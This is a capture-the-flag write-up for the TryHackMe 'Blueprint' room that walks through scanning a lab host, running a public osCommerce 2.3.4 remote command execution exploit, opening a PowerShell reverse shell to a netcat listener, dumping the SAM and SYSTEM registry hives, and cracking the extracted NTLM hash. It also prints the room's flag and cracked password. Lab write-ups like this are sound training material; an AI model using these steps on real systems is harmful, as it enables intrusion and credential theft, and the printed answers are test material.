# **BLUEPRINT — THM CTF — WRITEUP**

# Hello everyone\! This is a beginner-friendly room from the TryHackMe platform titled “Blueprint”

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image1]

![][image2]

First, we deploy the machine. While it’s booting up, go ahead and open your terminal tab and get it ready.

As the victim IP shows a negative website

![][image3]

![][image4]

Once it’s up, let’s copy the IP address and connect to the network. We encounter a web page with some image and text.

![][image5]

I initiate an Nmap scan and run a Feroxbuster scan

***nmap 10.10.66.49 \-O***

***feroxbuster \-u http://10.10.66.49 \-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt***

No fruitful results from Ferox, but browsing manually under 8080 reveals a **directory of files**.

![][image6]

![][image7]

***http://10.10.66.49:8080***

***![][image8]***

Click around and look through the available documentation. One term stands out:

![][image9]

***osCommerce***

A quick Google search confirms: **osCommerce 2.3.4** is vulnerable to **Remote Command Execution (RCE)**.

![][image10]

Found this GitHub repo for the exploit:

## [**GitHub \- nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution: osCommerce 2.3.4 Remote Command…**](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution?source=post_page-----bc77044228e4---------------------------------------)

### [osCommerce 2.3.4 Remote Command Execution. Contribute to nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution…](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution?source=post_page-----bc77044228e4---------------------------------------)

[github.com](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution?source=post_page-----bc77044228e4---------------------------------------)

First, clone the repository:

![][image11]

***git clone [https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution.git](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution.git)***

***![][image12]***

***cd osCommerce-2.3.4-Remote-Command-Execution***

Based on the GitHub README, target the **/catalog/** subdirectory.

Run the exploit with:

![][image13]

***python3 osCommerce2\_3\_4RCE.py [http://10.10.66.49:8080/oscommerce-2.3.4/catalog/](http://10.10.66.49:8080/oscommerce-2.3.4/catalog/)***

Command prompt appears. Try:

***whoami***

Now, Generate a PowerShell reverse shell payload using [RevShells](https://www.revshells.com/):

![][image14]

* Choose: **PowerShell Base64 (PowerShell v3)**  
* Replace IP with your local tun0 IP  
* Choose a port (e.g., **4445**)

![][image15]

Start a listener:

![][image16]

***nc \-lvnp 4445***

Paste the generated reverse shell payload into the RCE shell.

Boom — shell connected.

![][image17]

Use cd .. repeatedly to reach the base drive, then:

![][image18]

***cd Users***  
***cd Administrator***  
***cd Desktop***  
***cat root.txt.txt***

Then we get the Flag:

THM{aea1e3ce6fe7f89e10cea833ae009bee}

![][image19]

![][image20]

You’re on a **Windows machine**, and Windows stores password hashes in the registry under:

***C:\\Windows\\System32\\config\\SAM***  
***C:\\Windows\\System32\\config\\SYSTEM***

We’re going to dump these keys using reg save via RCE:

***cd Xampp***  
***cd htdocs***  
***cd oscommerce-2.3.4***

***reg save HKLM\\SAM sam.hiv***  
***reg save HKLM\\SYSTEM system.hiv***

Now browse to the /oscommerce-2.3.4/ directory from the browser to **download both files**.

Move into your download folder and run:

![][image21]

***samdump2 system.hiv sam.hiv***

Output:

***aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450***

* The left hash is a blank LM hash  
* The right one is the **NTLM hash**

**![][image22]**

Crack it on CrackStation or using John:

![][image23]

***30e87bf999828446a1c1209ddde4c450 → googleplus***

googleplus
